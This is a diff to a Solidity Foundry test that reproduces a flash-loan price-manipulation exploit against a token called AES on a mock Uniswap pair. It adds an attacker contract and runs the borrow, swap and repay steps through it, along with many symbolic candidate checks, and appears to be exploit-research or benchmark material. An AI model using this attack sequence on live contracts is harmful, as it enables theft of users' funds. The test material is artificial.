@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 import "./AES.sol";
+import "./AttackContract.sol";
 import "@utils/QueryBlockchain.sol";
 import "forge-std/Test.sol";
 import {USDT} from "@utils/USDT.sol";
@@ -14,13 +15,15 @@ contract AESTest is Test, BlockLoader {
     UniswapV2Pair pair;
     UniswapV2Factory factory;
     UniswapV2Router router;
+    AttackContract attackContract;
+    address owner;
     address attacker;
-    address owner = address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
     address aesAddr;
     address usdtAddr;
     address pairAddr;
     address factoryAddr;
     address routerAddr;
+    address attackContractAddr;
     uint256 blockTimestamp = 1670403423;
     uint112 reserve0pair = 64026931732834970073285;
     uint112 reserve1pair = 3976072419420817555481090;
@@ -38,9 +41,7 @@ contract AESTest is Test, BlockLoader {
     uint256 balanceOfusdt = 0;
 
     function setUp() public {
-        vm.warp(blockTimestamp);
-        attacker = address(this);
-        vm.startPrank(owner);
+        owner = address(this);
         aes = new AES(
             "AES",
             "AES",
@@ -76,13 +77,15 @@ contract AESTest is Test, BlockLoader {
         factoryAddr = address(factory);
         router = new UniswapV2Router(address(factory), address(0xdead));
         routerAddr = address(router);
+        attackContract = new AttackContract();
+        attackContractAddr = address(attackContract);
+        attacker = address(attackContract);
         aes.afterDeploy(address(router), address(pair));
         // Initialize balances and mock flashloan.
         usdt.transfer(address(pair), balanceOfusdtpair);
         aes.transfer(address(pair), balanceOfaespair);
         usdt.approve(attacker, UINT256_MAX);
         aes.approve(attacker, UINT256_MAX);
-        vm.stopPrank();
     }
 
     function printBalance(string memory tips) public {
@@ -107,9 +110,17 @@ contract AESTest is Test, BlockLoader {
         );
         queryERC20BalanceDecimals(address(aes), address(pair), aes.decimals());
         emit log_string("");
-        emit log_string("Attacker Balances: ");
-        queryERC20BalanceDecimals(address(usdt), attacker, usdt.decimals());
-        queryERC20BalanceDecimals(address(aes), attacker, aes.decimals());
+        emit log_string("Attackcontract Balances: ");
+        queryERC20BalanceDecimals(
+            address(usdt),
+            address(attackContract),
+            usdt.decimals()
+        );
+        queryERC20BalanceDecimals(
+            address(aes),
+            address(attackContract),
+            aes.decimals()
+        );
         emit log_string("");
         emit log_string("");
         emit log_string("");
@@ -181,6 +192,7 @@ contract AESTest is Test, BlockLoader {
     }
 
     function test_gt() public {
+        vm.startPrank(attacker);
         borrow_usdt(100000e18);
         printBalance("After step0 ");
         swap_pair_usdt_aes(usdt.balanceOf(attacker));
@@ -194,6 +206,7 @@ contract AESTest is Test, BlockLoader {
         payback_usdt((100000e18 * 1003) / 1000);
         printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
+        vm.stopPrank();
     }
 
     function check_gt(
@@ -203,6 +216,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_aes(amt1);
@@ -211,6 +225,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_aes_usdt(amt3);
         payback_usdt(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand000(
@@ -220,6 +235,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_aes(amt1);
@@ -227,6 +243,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_aes_usdt(amt3);
         payback_usdt(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand001(
@@ -237,6 +254,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_aes(amt1);
@@ -245,6 +263,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_aes_usdt(amt4);
         payback_usdt(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand002(
@@ -254,6 +273,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_aes(amt1);
@@ -262,6 +282,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_aes_usdt(amt3);
         payback_usdt(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand003(
@@ -272,6 +293,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_aes(amt1);
@@ -280,6 +302,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_aes_usdt(amt4);
         payback_usdt(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand004(
@@ -290,6 +313,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_aes(amt1);
@@ -299,6 +323,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_aes_usdt(amt4);
         payback_usdt(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand005(
@@ -310,6 +335,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_aes(amt1);
@@ -319,6 +345,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_aes_usdt(amt5);
         payback_usdt(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand006(
@@ -329,6 +356,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_aes(amt1);
@@ -338,6 +366,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_aes_usdt(amt4);
         payback_usdt(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand007(
@@ -349,6 +378,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_aes(amt1);
@@ -358,6 +388,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_aes_usdt(amt5);
         payback_usdt(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand008(
@@ -369,6 +400,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_aes(amt1);
@@ -379,6 +411,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_aes_usdt(amt5);
         payback_usdt(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand009(
@@ -391,6 +424,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_aes(amt1);
@@ -401,6 +435,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_aes_usdt(amt6);
         payback_usdt(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand010(
@@ -412,6 +447,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_aes(amt1);
@@ -422,6 +458,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_aes_usdt(amt5);
         payback_usdt(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand011(
@@ -434,6 +471,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_aes(amt1);
@@ -444,6 +482,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_aes_usdt(amt6);
         payback_usdt(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand012(
@@ -456,6 +495,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_aes(amt1);
@@ -467,6 +507,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_aes_usdt(amt6);
         payback_usdt(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand013(
@@ -480,6 +521,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt7,
         uint256 amt8
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt8 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_aes(amt1);
@@ -491,6 +533,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_aes_usdt(amt7);
         payback_usdt(amt8);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand014(
@@ -503,6 +546,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_aes(amt1);
@@ -514,6 +558,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_aes_usdt(amt6);
         payback_usdt(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand015(
@@ -527,6 +572,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt7,
         uint256 amt8
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt8 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_aes(amt1);
@@ -539,5 +585,6 @@ contract AESTest is Test, BlockLoader {
         swap_pair_aes_usdt(amt7);
         payback_usdt(amt8);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 }
